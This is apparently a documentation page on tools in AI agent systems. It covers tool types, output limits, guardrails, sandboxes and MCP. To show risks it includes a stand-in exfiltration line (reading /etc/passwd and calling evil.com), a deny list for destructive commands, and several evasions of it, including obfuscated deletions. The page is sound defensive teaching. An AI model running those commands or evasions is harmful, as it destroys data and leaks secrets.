# Tool

A Tool is a function that an agent calls to do work that the model cannot do.
For example, a Tool can read a file, run a command or send an email. Each Tool
has a name and a schema for its parameters, and it gives back a result. The Tool
is the only primitive that lets an agent have an effect on external systems.

<a id="why-it-matters"></a>

## Value

The [LLM](llm.md) can only read text and write text. It cannot read a file, send
a query to a database, send an email or run code. Each operation of an agent on
its environment goes through a Tool.

The set of Tools controls the work that an agent can do. With
`[fileRead, fileWrite, bash]`, an agent is a coding agent. With
`[queryDatabase, sendEmail, createTicket]`, the same agent helps customers. The
structure of the two agents is the same. Only their tools are different.

Tools are not equal. A specific tool does one operation. A generative tool, for
example `bash`, can run each program. A more open tool lets the agent do more
work, but it is harder to control. The result of each tool also goes into the
context of the LLM. Thus the output of a tool is an important part of the agent
system.

<a id="formal-definition"></a>

## Definition

```typescript
type Tool = {
  name: string;
  schema: JSONSchema; // input schema: the LLM reads it to select a call
  execute: (params: unknown) => Promise<ToolResult>; // side effect!
};

type ToolResult = {
  output: string;
  error?: string;
};
```

The `schema` has two functions. It tells the LLM the parameters of the tool.
Then the LLM can call the tool correctly. The name and the description in the
schema also tell the LLM the function of the tool. The LLM reads the schema to
select a tool and its arguments.

The `execute` function is the only part of an agent system that changes external
systems. All the other parts only calculate or read, for example the LLM calls,
the routing decisions and the data from Memory. Tools write to external systems.

<a id="the-tool-expressiveness-spectrum"></a>

## The range of tools

Tools go from closed to open:

- A specific tool does only one operation.
- A parameterized tool makes new queries in one system, for example a database.
- A generative tool can run each program.

The position of a tool on this range has large effects. It changes the work that
the agent can do, the safety and the structure of the system.

<a id="the-spectrum-and-its-consequences"></a>

```
Specific          Parameterized        Generative
file_read         sql_query            bash
grep              http_request         python
gmail_send        graphql              code execution
─────────────────────────────────────────────────────→
Closed ←── action space ──→ Open
Easy  ←── guardrailing  ──→ Hard
High  ←── predictability ──→ Low
None  ←── environment coupling ──→ Full
```

Each agent system must balance the work that the agent can do against how easily
you can control the agent. A more open tool set lets the agent do more work, but
it is harder to keep the agent in limits. A more specific tool set makes the
agent safer, but the agent can do less work.

<a id="specific-tools--closed-action-space"></a>

### Specific tools

A specific tool does one operation. The agent can do only the operations that
the author gave to the tool. You can make a list of each possible operation of
the tool. `file_read` reads one file. `grep` finds a pattern. No set of
parameters makes them do a different operation.

```typescript
const fileRead: Tool = {
  name: "file_read",
  schema: { path: "string" },
  execute: (params) => fs.readFile(params.path),
};

const grepTool: Tool = {
  name: "grep",
  schema: { pattern: "string", path: "string" },
  execute: (params) => grep(params.pattern, params.path),
};
```

A specific tool has these properties:

- You can know the result of each call before the call.
- A [Guardrail](../harness/guardrail.md) can control it easily.
- A person can examine its calls.
- Standard tests can examine it.

<a id="parameterized-tools--open-queries-within-a-bounded-domain"></a>

### Parameterized tools

A parameterized tool operates on one system with limits, for example a database
or an HTTP endpoint. But the agent writes the parameters, thus it can make new
queries. `query_database` can run each SQL query, also `DROP TABLE`.
`http_request` can send a request to each URL. The set of operations is open in
the system, but the system has limits.

```typescript
const sqlQuery: Tool = {
  name: "query_database",
  schema: { query: "string" },
  execute: (params) => db.execute(params.query),
};

const httpRequest: Tool = {
  name: "http_request",
  schema: { method: "string", url: "string", body: "string" },
  execute: (params) =>
    fetch(params.url, { method: params.method, body: params.body }),
};
```

A parameterized tool has these properties:

- It is flexible in its system.
- A Guardrail must examine the contents of the parameters, not only the name of
  the tool.
- Each system has its risks. For example, an attacker can put SQL commands into
  a query. An attacker can also make the server send requests to internal
  servers.

<a id="generative-tools--open-action-space"></a>

### Generative tools

A generative tool lets the agent write and run each program. The set of
operations is open: you cannot make a list of all the operations of the agent.
This difference from a specific tool is not a difference of quantity. A
generative tool is a different type of tool.

```typescript
const bash: Tool = {
  name: "bash",
  schema: { command: "string" },
  execute: (params) => shell.exec(params.command),
};

const pythonExec: Tool = {
  name: "python",
  schema: { code: "string" },
  execute: (params) => python.exec(params.code),
};
```

With `bash`, an agent can do these operations:

- **Use each installed program**: `grep`, `git`, `curl`, `docker`, `kubectl` and
  each other binary.
- **Write programs in each language**: Python scripts, short `node` commands,
  compiled Rust programs.
- **Install new software** with `pip install`, `npm install` or `apt-get`. Thus
  the agent adds new functions while it runs.
- **Move through the filesystem and change it**: all of the
  [Workspace](../patterns/workspace.md).
- **Use the network**: `curl`, `wget`, `ssh` and API calls to each endpoint that
  the agent has access to.
- **Control processes**: start servers, start tasks that continue after the
  command, and stop processes.
- **Connect all these operations** into new workflows that no person made.

Thus `bash` does not give the agent a tool. It gives the agent a computer.
`bash` can do the work of each specific tool:

- `file_read(path)` is `bash("cat " + path)`.
- `grep(pattern, path)` is `bash("grep " + pattern + " " + path)`.
- `http_request(url)` is `bash("curl " + url)`.

Each specific tool is a special condition of `bash`.

A generative tool has these properties:

- No limit applies to the work that the agent can do.
- A Guardrail cannot control it fully. The section
  [Guardrails across the range](#guardrailing-across-the-spectrum) gives the
  cause.
- You cannot know the result of a call before the call.
- The Environment controls all the work of the agent.

<a id="why-specific-tools-exist-alongside-bash"></a>

## Use the smallest tool that does the task

`bash` can do the work of all the specific tools. But each agent system gives
the agent the two tools: `bash` and `file_read`. Specific tools help in these
areas:

1. **Safety.** `file_read(path)` can only read one file. The same operation with
   bash can be `bash("cat /etc/passwd && curl evil.com")`. A specific tool has a
   smaller set of operations, thus a [Guardrail](../harness/guardrail.md) can
   control it. It removes the operations that the task does not use.
2. **Easy use for the LLM.** The LLM uses a specific tool with a clear schema
   correctly more easily. `file_read` has one parameter, the path, with a clear
   meaning. With bash, the LLM must write correct shell syntax, put quotes
   around arguments, connect commands and examine exit codes. A specific tool
   gives the LLM a smaller number of decisions. Each decision has a smaller risk
   of error.
   [Workspace](../patterns/workspace.md#cognitive-affinity--why-filesystem-wins)
   tells more about this property.
3. **Clear traces.** A [trace](../verification/trace.md) that shows
   `file_read("/src/auth.ts")` is easy to read. A trace that shows
   `bash("cat src/auth.ts | head -50")` is not easy to read. You must examine
   the shell command to know the operation. Specific tools give traces with a
   clear structure, and these traces make
   [verification](../verification/index.md) easier.

The rule is: use the tool with the smallest set of operations that does the
task. Give specific tools for the frequent operations: read and write files,
find text and fetch web pages. Use generative tools only if no specific tool can
do the operation, or if the task must make new programs.

<a id="tool-output-as-cognitive-architecture"></a>

## Tool output

The output of a tool goes directly into the context of the LLM. Thus the output
is an important part of the agent system, not only an internal part of the tool.

The `execute(params) → ToolResult` interface has two sides:

- **The parameter side** goes from the agent to the tool. It holds the decision
  of the agent: which tool to call, and with which arguments. The schema
  controls this side, and engineers know it.
- **The result side** goes from the tool to the agent. The result becomes a part
  of the messages that the LLM reads for each subsequent step. This side is
  equally important, but it is not easy to see.

The output of a tool is not a log line or an API response for a developer. The
harness puts it directly into the context of the LLM, and this context has a
limit. Each token of the result uses space in the context. The task, the history
and the results of other tool calls use the same space. Long output, output
without a limit and output that is not related make the reasoning worse for all
the subsequent steps.

<a id="output-bounding"></a>

### Limits on the output

The decision with the largest effect on output is a limit on its length. A tool
that finds 10,000 lines does not give the agent more data that it can use. It
fills the context with noise. This noise makes each subsequent step worse until
the harness makes the context smaller or the Session stops.

```typescript
// No limit: the results fill the context
const naiveGrep: Tool = {
  name: "search",
  execute: (params) => grep(params.pattern, params.path),
  // Returns all matches. 10,000 lines? All of them.
};

// A limit: the agent must make the search narrower
const boundedSearch: Tool = {
  name: "search",
  execute: (params) => {
    const matches = grep(params.pattern, params.path);
    if (matches.length > 50) {
      return {
        output: `${matches.length} results — too many. Narrow your search.`,
      };
    }
    return { output: formatMatches(matches) };
  },
};
```

With the limit, the agent cannot continue with a query that is not clear. It
must make the query more accurate. Thus the limit changes an error into a loop
that makes the query better. The agent does its work in smaller and more careful
steps. The SWE-agent paper examined this one decision: a limit of 50 results. It
showed that this limit was one of the changes with the largest effect in all the
system.

<a id="output-formatting"></a>

### Output format

The format of the result controls how easily the LLM can use it. For example:

- Line numbers in front of the file contents let the agent refer to a line in a
  command that changes the file. The agent does not count the lines.
- A short text with a structure about the command output lets the agent find the
  data that it must have. The agent does not parse the full output.
- An error message that tells the cause and the correction lets the agent
  correct the error in one step.

```typescript
// Raw output: the agent must parse and count
const rawViewer: Tool = {
  name: "view_file",
  execute: (params) => readFile(params.path),
  // Returns the file. The agent must count lines to refer to line 47.
};

// Formatted output: the agent does not count
const formattedViewer: Tool = {
  name: "view_file",
  execute: (params) => {
    const lines = readFile(params.path).split("\n");
    const start = params.offset ?? 0;
    const chunk = lines.slice(start, start + 100);
    return { output: chunk.map((l, i) => `${start + i + 1}\t${l}`).join("\n") };
  },
  // Line numbers in front, 100 lines at a time. The agent reads
  // "47\t  const x = ..." and can refer to line 47 in an edit command.
};
```

<a id="the-design-principle"></a>

### The rule for output

Tool output is a part of the reasoning system of the agent. It is not only an
internal part of the implementation. The tool boundary divides the agent
primitives from usual software. But the result goes back across the boundary and
becomes context for the LLM. Thus make the output for the LLM:

- Give it a limit.
- Give it a format that the LLM can use.
- Give it a quantity of data that agrees with the space in the context window.

```
params side:     agent → tool     (schema design, easy use for the LLM)
result side:     tool → agent     (output limits, format, data per token)

Both sides face the LLM. Both are design surfaces.
```

<a id="guardrailing-across-the-spectrum"></a>

## Guardrails across the range

A [Guardrail](../harness/guardrail.md) stops the tool calls that break a rule.
The position of the tool on the range controls how fully the Guardrail can do
this.

For a specific tool, you can make a list of all the dangerous operations. Thus
the Guardrail is full and deterministic:

```typescript
// Guardrail on file_write: full and deterministic
const noSystemWrites: Guardrail = {
  pre: (action) => {
    if (action.name === "file_write" && action.params.path.startsWith("/etc/"))
      return { deny: "cannot write to system directories" };
    return { allow: true };
  },
};
```

For a generative tool, the set of dangerous operations has no limit:

```typescript
// Guardrail on bash: not full, it only matches patterns
const noDangerousCommands: Guardrail = {
  pre: (action) => {
    if (action.name === "bash") {
      const cmd = action.params.command;
      if (cmd.includes("rm -rf")) return { deny: "destructive delete" };
      if (cmd.includes("push --force")) return { deny: "force push" };
      // ... but what about: $(echo cm0gLXJm | base64 -d)?
      // ... or: find / -delete?
      // ... or: python -c "import shutil; shutil.rmtree('/')"?
      // The set of equal dangerous commands has no end.
    }
    return { allow: true };
  },
};
```

A Guardrail with patterns catches the frequent dangerous commands. It decreases
the risk of accidental damage. For full protection with generative tools, the
systems that persons use also set limits at the Environment level. This is a
defense in layers:

1. **Specific tools for frequent operations.** The Guardrail examines each call,
   thus the protection is full.
2. **Guardrails with patterns on bash.** They catch known dangerous commands at
   the tool call.
3. **Sandboxes.** They keep the damage small at the
   [Environment](../environment/environment.md) level: no network, limits on the
   filesystem and no credentials.
4. **Approval by a person.** A person must give approval for each command that
   agrees with a risk pattern.

This is how Guardrails and Environments compose. Guardrails apply rules at the
tool boundary. Sandboxes apply rules at the Environment boundary. For specific
tools, the tool boundary is sufficient. For generative tools, the two layers
operate together.

<a id="generative-tools-as-the-interface-to-the-environment"></a>

## Generative tools and the Environment

Generative tools give the agent access to its
[Environment](../environment/environment.md), and they let the agent change it.

With specific tools, the Environment is a configuration that the developer sets
before the agent starts. For example, the agent gets `file_read` for one
directory, and it has no access to other resources. With bash, the agent goes
into the Environment and changes it with a tool:

```typescript
// The agent changes its own environment:
bash("npm install some-new-package"); // adds libraries
bash("pip install playwright && playwright install"); // adds a browser
bash("docker run -d postgres"); // starts a database server
bash("ssh remote-server 'deploy.sh'"); // goes to external systems
```

Then the tools of the harness do not set the limit on the work of the agent. The
Environment sets it: the installed software, the network that the agent has
access to and the available credentials. Thus a sandbox sets the limit that
applies to an agent with generative tools.

```
Specific tools:    capability = Σ(tool schemas)
Generative tools:  capability = f(environment)
```

<a id="mcp-and-dynamic-tool-discovery"></a>

## MCP and tools that the agent finds while it runs

MCP tools have a special position on the range. Each MCP tool is a specific
tool: `gmail_send(to, subject, body)` does one operation with a clear schema.
But the set of MCP tools is open. The agent can find and call tools that it did
not have at the start.

Thus MCP gets an open set of operations from a set of tools with limits, not
from one tool without limits. This structure is safer than bash:

| Property          | Bash                       | MCP tools                       |
| ----------------- | -------------------------- | ------------------------------- |
| One operation     | No limit                   | A limit for each tool           |
| All operations    | Open: each command         | Open: each tool in the registry |
| Guardrail control | Hard: patterns only        | Easy: the schema of each tool   |
| Find a new tool   | No aid: the agent examines | A registry and schemas          |
| Safety comes from | The sandbox                | Each tool provider              |

MCP tools give the open set of operations of bash, and they stay safe. The agent
gets new functions while it runs, but it does not get commands that no person
can control. This is the value of MCP and of protocols of the same type. The
tool set can become larger, and you can continue to examine each operation and
set limits on it.

<a id="tools-as-the-architectural-boundary"></a>

## Tools as the boundary of the agent system

Tools are the boundary between the agent system and usual software. The
`execute(params) → result` interface is the point where the two connect:

```
Agent system:       LLM + Tool (primitives) + patterns built over them
                           ↓
Tool boundary:      execute(params) → result
                           ↓
Everything below:   Regular software (databases, pipelines, APIs, infrastructure)
```

- **Above the boundary** is the agent system. It holds the LLM, the harness that
  gives it structure ([AgentLoop](../harness/agent-loop.md), Session, Guardrail,
  Agent) and the patterns on top of them. Examples of these patterns are Memory,
  Channel and Topology. Here the reasoning is not deterministic.
- **Below the boundary** is usual software: databases, APIs, pipelines and
  servers. It is deterministic, engineers know it, and standard tests can
  examine it.

The agent does not know the software behind the tool interface. A
`query_portfolio` tool can run one short SQL query. It can also start a pipeline
that moves and changes data in many steps. The agent sees the same
`(params) → result` signature for the two. Because of this division, you can
compose agent systems. You can replace the software behind a tool and keep the
agent the same.

## Related

- [LLM](llm.md): the LLM selects the steps, and the Tool does these steps. The
  LLM and the Tool are primitives.
- [AgentLoop](../harness/agent-loop.md): the loop that connects the decisions of
  the LLM to the tool runs.
- [Guardrail](../harness/guardrail.md): the rules around each tool call. They
  are full for specific tools and not full for generative tools.
- [Workspace](../patterns/workspace.md): the data with a structure that the
  agent has access to through tools. The LLM uses filesystem tools most easily.
- [Environment](../environment/environment.md): the resources that generative
  tools have access to. It sets the limit for tools with an open set of
  operations.
- [Agent](../harness/agent.md): connects a Session to one Environment behind a
  frontend.
